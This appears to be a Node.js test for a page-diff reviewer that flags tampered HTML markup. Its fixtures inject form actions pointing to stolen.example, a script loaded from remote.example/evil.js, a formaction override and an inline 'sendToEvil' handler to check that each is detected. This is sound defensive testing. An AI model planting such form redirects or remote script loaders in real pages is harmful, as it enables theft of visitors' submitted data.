'use strict';
const assert=require('node:assert/strict');
const M=require('../lib/public-static-sensitive-markup.cjs');
const base='<!doctype html><html><head><link rel="stylesheet" href="/assets/theme.css"></head><body>'+
 '<main><form id="form1" action="https://collector.example/forms/pilot/lead" method="post">'+
 '<input type="hidden" name="_release" value="42">'+
 '<input type="hidden" name="_token" value="'+('a'.repeat(64))+'"></form>'+
 '<script src="/assets/site.js" integrity="sha256-TEST" crossorigin="anonymous"></script>'+
 '<a href="/about/" target="_blank" rel="noopener">About</a>'+
 '<img src="/assets/picture.webp" loading="lazy" decoding="async"></main></body></html>';
const good=M.review(base,base);
assert.equal(good.matched,true);
assert.equal(good.comparedCategories,9);
const action=M.review(base,base.replace('https://collector.example/forms/pilot/lead',
 'https://stolen.example/forms/pilot/lead'));
assert.ok(action.changedCategories.includes('formDestinations'));
const hmac=M.review(base,base.replace('a'.repeat(64),'b'.repeat(64)));
assert.ok(hmac.changedCategories.includes('formSecurityMarkers'));
const script=M.review(base,base.replace('src="/assets/site.js"','src="https://remote.example/evil.js"'));
assert.ok(script.changedCategories.includes('scriptLoaders'));
const rel=M.review(base,base.replace('target="_blank" rel="noopener"','target="_blank"'));
assert.ok(rel.changedCategories.includes('linkOpenerPolicy'));
const loading=M.review(base,base.replace('loading="lazy"','loading="eager"'));
assert.ok(loading.changedCategories.includes('imageLoadingPolicy'));
const override=M.review(base,base.replace('</form>',
 '<button type="submit" formaction="https://stolen.example/post">Send</button></form>'));
assert.ok(override.changedCategories.includes('submitOverrides'));
const handler=M.review(base,base.replace('<main>',
 '<main onclick="sendToEvil();" style="opacity:0.5">'));
assert.ok(handler.changedCategories.includes('inlineExecutionAttrs'));
assert.ok(!JSON.stringify(handler).includes('sendToEvil'));
assert.equal(hmac.hiddenTokenValuesReturned,false);
assert.ok(!JSON.stringify(hmac).includes('b'.repeat(64)));
assert.ok(!JSON.stringify(action).includes('stolen.example'));
console.log('Public form collector, HMAC marker, script/link and image policy parity smoke PASS');
